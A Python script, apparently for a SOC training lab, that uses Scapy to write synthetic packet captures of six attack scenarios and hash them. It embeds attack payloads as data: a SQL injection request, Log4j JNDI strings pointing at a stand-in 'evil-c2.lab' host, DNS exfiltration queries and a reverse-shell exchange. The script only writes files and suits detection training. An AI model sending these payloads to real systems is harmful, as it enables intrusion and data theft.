"""
PCAP Sample Generator & Hash Verification Tool for SOC Lab
Generates real packet capture (.pcap) files for 6 key attack scenarios:
1. ATK-001: ICMP Echo / Ping Diagnostic & Flood (T1498)
2. ATK-002: Web SQL Injection UNION SELECT (T1190)
3. ATK-003: Nmap Stealth NULL / XMAS / FIN Scans (T1046)
4. ATK-004: Apache Log4j JNDI RCE Exploit (${jndi:}) (T1190)
5. ATK-005: SSH High-Frequency Brute Force (T1110)
6. ATK-006: Malware C2 DNS Tunneling & Reverse Shell (T1071.004, T1059.004)
Computes SHA-256 integrity hashes and generates metadata.
"""

import hashlib
import json
import sys
from pathlib import Path
from scapy.all import (
    IP, TCP, UDP, ICMP, DNS, DNSQR, Raw, wrpcap, Ether
)

if sys.platform == "win32" and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

# Output directories
PCAP_DIR = Path("pcaps/samples")
META_DIR = Path("pcaps/metadata")
PCAP_DIR.mkdir(parents=True, exist_ok=True)
META_DIR.mkdir(parents=True, exist_ok=True)

SRC_IP = "10.77.20.20"  # soc-attacker
DST_IP = "10.77.30.20"  # soc-victim
SRC_MAC = "00:15:5d:20:00:20"
DST_MAC = "00:15:5d:30:00:20"


def create_eth_ip_tcp(sport, dport, flags, payload=b""):
    pkt = Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=SRC_IP, dst=DST_IP) / TCP(sport=sport, dport=dport, flags=flags)
    if payload:
        pkt = pkt / Raw(load=payload)
    return pkt


# 1. ATK-001: ICMP Ping Echo Request & Reply
print("[*] Generating ATK-001 ICMP PCAP...")
icmp_pkts = []
for i in range(4):
    req = Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=SRC_IP, dst=DST_IP) / ICMP(type=8, code=0, seq=i+1) / Raw(load=b"SOC-LAB-ICMP-TEST-DATA")
    rep = Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / ICMP(type=0, code=0, seq=i+1) / Raw(load=b"SOC-LAB-ICMP-TEST-DATA")
    icmp_pkts.extend([req, rep])
pcap_1 = PCAP_DIR / "PCAP-20260824-ATK-001-ICMP.pcap"
wrpcap(str(pcap_1), icmp_pkts)

# 2. ATK-002: Web SQL Injection
print("[*] Generating ATK-002 Web SQL Injection PCAP...")
sqli_payload = (
    b"GET /rest/products/search?q=apple'+UNION+SELECT+1,2,3,database()-- HTTP/1.1\r\n"
    b"Host: 10.77.30.20:3000\r\n"
    b"User-Agent: Mozilla/5.0 (Kali Linux SOC Lab)\r\n"
    b"Accept: */*\r\n\r\n"
)
sqli_pkts = [
    create_eth_ip_tcp(45100, 3000, "S"),
    Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=3000, dport=45100, flags="SA"),
    create_eth_ip_tcp(45100, 3000, "A"),
    create_eth_ip_tcp(45100, 3000, "PA", sqli_payload),
    Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=3000, dport=45100, flags="PA", seq=1, ack=len(sqli_payload)+1) / Raw(load=b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"status\":\"success\"}"),
]
pcap_2 = PCAP_DIR / "PCAP-20260824-ATK-002-SQLI.pcap"
wrpcap(str(pcap_2), sqli_pkts)

# 3. ATK-003: Nmap Stealth Scans (NULL & XMAS & FIN)
print("[*] Generating ATK-003 Nmap Scans PCAP...")
scan_pkts = [
    # NULL scan (flags=0)
    Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=SRC_IP, dst=DST_IP) / TCP(sport=50001, dport=80, flags=0),
    Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=SRC_IP, dst=DST_IP) / TCP(sport=50002, dport=443, flags=0),
    # XMAS scan (flags=FPU -> FIN+PSH+URG)
    Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=SRC_IP, dst=DST_IP) / TCP(sport=50003, dport=22, flags="FPU"),
    Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=50004, dport=3000, flags="FPU"),
    # FIN scan (flags=F)
    Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=SRC_IP, dst=DST_IP) / TCP(sport=50005, dport=8080, flags="F"),
]
pcap_3 = PCAP_DIR / "PCAP-20260824-ATK-003-SCAN.pcap"
wrpcap(str(pcap_3), scan_pkts)

# 4. ATK-004: Apache Log4j JNDI RCE Exploit
print("[*] Generating ATK-004 Log4j RCE PCAP...")
log4j_payload = (
    b"GET /api/v1/health HTTP/1.1\r\n"
    b"Host: 10.77.30.20:3000\r\n"
    b"User-Agent: ${jndi:ldap://evil-c2.lab:1389/Exploit}\r\n"
    b"X-Api-Version: ${jndi:rmi://10.77.20.20:1099/Payload}\r\n\r\n"
)
log4j_pkts = [
    create_eth_ip_tcp(45200, 3000, "S"),
    Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=3000, dport=45200, flags="SA"),
    create_eth_ip_tcp(45200, 3000, "A"),
    create_eth_ip_tcp(45200, 3000, "PA", log4j_payload),
]
pcap_4 = PCAP_DIR / "PCAP-20260824-ATK-004-LOG4J.pcap"
wrpcap(str(pcap_4), log4j_pkts)

# 5. ATK-005: SSH Brute Force
print("[*] Generating ATK-005 SSH Brute Force PCAP...")
ssh_pkts = []
for p in range(6):
    sport = 46000 + p
    ssh_pkts.extend([
        create_eth_ip_tcp(sport, 22, "S"),
        Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=22, dport=sport, flags="SA"),
        create_eth_ip_tcp(sport, 22, "A"),
        create_eth_ip_tcp(sport, 22, "PA", b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"),
    ])
pcap_5 = PCAP_DIR / "PCAP-20260824-ATK-005-BRUTEFORCE.pcap"
wrpcap(str(pcap_5), ssh_pkts)

# 6. ATK-006: Malware C2 DNS Tunneling & Reverse Shell
print("[*] Generating ATK-006 C2 DNS Tunneling & Reverse Shell PCAP...")
dns_pkts = []
# DNS Exfiltration queries
subdomains = [
    b"dGhpcy1pcy1hLXNlY3JldC1leGZpbHRyYXRpb24tdG9rZW4=.evil-c2.lab",
    b"Y29uZmlkZW50aWFsLWRhdGEtcGFja2V0LTAwMQ==.evil-c2.lab"
]
for sub in subdomains:
    dns_query = Ether(src=SRC_MAC, dst=DST_MAC) / IP(src=DST_IP, dst=SRC_IP) / UDP(sport=53530, dport=53) / DNS(rd=1, qd=DNSQR(qname=sub))
    dns_pkts.append(dns_query)

# Reverse shell on port 4444
rev_pkts = [
    Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=49999, dport=4444, flags="S"),
    create_eth_ip_tcp(4444, 49999, "SA"),
    Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=49999, dport=4444, flags="A"),
    Ether(src=DST_MAC, dst=SRC_MAC) / IP(src=DST_IP, dst=SRC_IP) / TCP(sport=49999, dport=4444, flags="PA") / Raw(load=b"/bin/sh: line 1: whoami\nroot\n"),
]
pcap_6 = PCAP_DIR / "PCAP-20260824-ATK-006-C2REVERSESHELL.pcap"
wrpcap(str(pcap_6), dns_pkts + rev_pkts)

# Hash & Record Metadata
all_pcaps = [pcap_1, pcap_2, pcap_3, pcap_4, pcap_5, pcap_6]
metadata_summary = []

for pcap_file in all_pcaps:
    content = pcap_file.read_bytes()
    sha256 = hashlib.sha256(content).hexdigest()
    rec = {
        "filename": pcap_file.name,
        "size_bytes": len(content),
        "sha256": sha256,
        "src_ip": SRC_IP,
        "dest_ip": DST_IP,
    }
    metadata_summary.append(rec)
    print(f"[+] {pcap_file.name}: SHA256 = {sha256}")

# Save JSON metadata
meta_file = META_DIR / "pcap_manifest.json"
meta_file.write_text(json.dumps(metadata_summary, indent=2), encoding="utf-8")
print(f"[+] PCAP manifest successfully written to {meta_file}")
